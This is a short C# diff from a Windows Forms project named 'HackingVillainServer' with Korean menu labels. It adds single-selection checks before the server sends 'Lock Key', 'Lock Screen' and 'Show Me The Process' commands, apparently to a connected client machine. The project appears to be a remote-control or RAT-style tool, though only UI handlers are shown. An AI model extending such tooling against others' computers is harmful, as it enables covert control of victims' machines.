@@ -102,27 +102,37 @@ namespace HackingVillainServer
 
         private void 활성화EToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            if (listView1.SelectedItems.Count != 1)
+                return;
             Send("UnLock Key");
         }
 
         private void 비활성화DToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            if (listView1.SelectedItems.Count != 1)
+                return;
             Send("Lock Key");
         }
 
         private void 활성화EToolStripMenuItem1_Click(object sender, EventArgs e)
         {
+            if (listView1.SelectedItems.Count != 1)
+                return;
             Send("UnLock Screen");
         }
 
         private void 비활성화DToolStripMenuItem1_Click(object sender, EventArgs e)
         {
+            if (listView1.SelectedItems.Count != 1)
+                return;
             Send("Lock Screen");
         }
 
         bool _readyForProcess = false;
         private void 프로세스ToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            if (listView1.SelectedItems.Count != 1)
+                return;
             _readyForProcess = true;
             Send("Show Me The Process");
         }
